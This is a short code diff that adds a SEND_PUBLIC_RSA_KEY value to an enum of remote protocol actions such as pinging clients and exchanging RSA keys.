@@ -19,6 +19,7 @@ enum RemoteAction {
     OPEN_REMOTE_PROCESS   = 0x317238,
     KILL_CLIENT           = 0x821921, // forcefully disconnect the client
     PING_CLIENT           = 0x94932,
+    SEND_PUBLIC_RSA_KEY = 0x392191,
     RETURN_PUBLIC_RSA_KEY = 0x403920, // respond to a request that asked for a public rsa key
     RETURN_PRIVATE_RSA_KEY = 0x94811,
 };
